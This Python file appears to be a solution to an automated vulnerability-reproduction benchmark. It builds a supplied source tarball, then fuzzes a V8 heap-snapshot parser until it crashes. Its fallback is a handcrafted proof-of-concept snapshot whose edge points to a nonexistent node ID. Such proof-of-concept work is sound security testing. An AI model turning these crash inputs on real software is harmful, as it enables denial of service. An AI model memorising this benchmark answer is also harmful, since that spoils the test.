import os
import sys
import tarfile
import subprocess
import tempfile
import shutil
import json
import random
import time
import re

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.
        Args:
            src_path: Path to the vulnerable source code tarball
        Returns:
            bytes: The PoC input that should trigger the vulnerability
        """
        temp_dir = tempfile.mkdtemp()
        try:
            # 1. Extract the tarball
            try:
                if src_path.endswith('.tar.gz') or src_path.endswith('.tgz'):
                    with tarfile.open(src_path, "r:gz") as tar:
                        tar.extractall(path=temp_dir)
                else:
                    with tarfile.open(src_path) as tar:
                        tar.extractall(path=temp_dir)
            except Exception:
                pass

            # 2. Locate source root and build
            src_root = temp_dir
            for root, dirs, files in os.walk(temp_dir):
                if 'Makefile' in files or 'CMakeLists.txt' in files or 'configure' in files:
                    src_root = root
                    break
            
            exe_path = self._build(src_root)
            
            # 3. Fuzzing Strategy
            # Use existing seeds from the source or a fallback minimal valid snapshot
            seeds = self._find_seeds(src_root)
            fallback = self._generate_fallback()
            seeds.append(fallback)
            
            # If we couldn't build, return the best-guess fallback
            if not exe_path:
                return fallback

            # Fuzz loop (time limited)
            start_time = time.time()
            while time.time() - start_time < 60:
                seed = random.choice(seeds)
                candidate = self._mutate(seed)
                
                if self._verify(exe_path, candidate):
                    return candidate
            
            return fallback

        finally:
            shutil.rmtree(temp_dir, ignore_errors=True)

    def _build(self, path):
        # Attempt to build using common build systems
        # 1. Makefile
        if os.path.exists(os.path.join(path, 'Makefile')):
            try:
                subprocess.run(['make', 'clean'], cwd=path, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                subprocess.run(['make', '-j8'], cwd=path, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                return self._find_exe(path)
            except: pass
            
        # 2. CMake
        if os.path.exists(os.path.join(path, 'CMakeLists.txt')):
            try:
                bdir = os.path.join(path, 'build_fuzz')
                os.makedirs(bdir, exist_ok=True)
                subprocess.run(['cmake', '..'], cwd=bdir, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                subprocess.run(['make', '-j8'], cwd=bdir, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                return self._find_exe(bdir)
            except: pass
            
        # 3. Configure/Make
        if os.path.exists(os.path.join(path, 'configure')):
            try:
                subprocess.run(['./configure'], cwd=path, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                subprocess.run(['make', '-j8'], cwd=path, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                return self._find_exe(path)
            except: pass
            
        # Fallback: check if an executable already exists
        return self._find_exe(path)

    def _find_exe(self, path):
        candidates = []
        for root, dirs, files in os.walk(path):
            for f in files:
                fp = os.path.join(root, f)
                if os.access(fp, os.X_OK) and not f.endswith('.sh') and not f.endswith('.py') and not f.endswith('.pl'):
                     candidates.append(fp)
        
        # Heuristic: Prefer binaries that look like the main tool (shortest name often)
        if candidates:
            candidates.sort(key=lambda x: len(os.path.basename(x)))
            return candidates[0]
        return None

    def _find_seeds(self, path):
        seeds = []
        for root, dirs, files in os.walk(path):
            for f in files:
                if f.endswith('.json') or f.endswith('.heapsnapshot'):
                    try:
                        with open(os.path.join(root, f), 'rb') as fd:
                            seeds.append(fd.read())
                    except: pass
        return seeds

    def _generate_fallback(self) -> bytes:
        # Construct a minimal V8 Heap Snapshot JSON
        # Vulnerability involves referencing a non-existent node ID in node_id_map.
        # We create a snapshot with 1 node (ID 1) and 1 edge pointing to a non-existent ID (e.g. 999999).
        data = {
            "snapshot": {
                "meta": {
                    "node_fields": ["type", "name", "id", "self_size", "edge_count", "trace_node_id"],
                    "node_types": [["hidden", "object"], "string", "number", "number", "number", "number"],
                    "edge_fields": ["type", "name_or_index", "to_node"],
                    "edge_types": [["context", "element"], "string_or_number", "node"]
                },
                "node_count": 1,
                "edge_count": 1
            },
            "nodes": [3, 0, 1, 0, 1, 0], # One node: type 3, name 0, ID 1...
            "edges": [0, 0, 999999],     # One edge: type 0, name 0, to_node 999999 (Invalid ID)
            "strings": [""]
        }
        return json.dumps(data, separators=(',', ':')).encode('utf-8')

    def _mutate(self, seed: bytes) -> bytes:
        # Try structure-aware mutation for JSON
        try:
            js = json.loads(seed)
            if "edges" in js and isinstance(js["edges"], list) and len(js["edges"]) > 0:
                # Mutate random edge target to a large invalid ID
                idx = random.randint(0, len(js["edges"]) - 1)
                if isinstance(js["edges"][idx], int):
                    js["edges"][idx] = random.choice([999999, 10000000, -1, 0])
                return json.dumps(js, separators=(',', ':')).encode('utf-8')
        except:
            pass
        
        # Fallback to byte-level mutation
        arr = bytearray(seed)
        if len(arr) > 0:
            idx = random.randint(0, len(arr)-1)
            arr[idx] = random.randint(0, 255)
        return bytes(arr)

    def _verify(self, exe, data):
        with tempfile.NamedTemporaryFile(delete=False) as tf:
            tf.write(data)
            tf.flush()
            fname = tf.name
        
        crashed = False
        # Try running with file argument
        try:
            r = subprocess.run([exe, fname], stdout=subprocess.DEVNULL, stderr=subprocess.PIPE, timeout=0.8)
            if r.returncode != 0:
                 # Check for crash (SEGV) or sanitizer error
                 if r.returncode == -11 or b"Sanitizer" in r.stderr or b"stack-overflow" in r.stderr:
                     crashed = True
        except: pass
        
        # Try running with stdin
        if not crashed:
            try:
                r = subprocess.run([exe], input=data, stdout=subprocess.DEVNULL, stderr=subprocess.PIPE, timeout=0.8)
                if r.returncode != 0:
                     if r.returncode == -11 or b"Sanitizer" in r.stderr or b"stack-overflow" in r.stderr:
                         crashed = True
            except: pass
            
        os.unlink(fname)
        return crashed
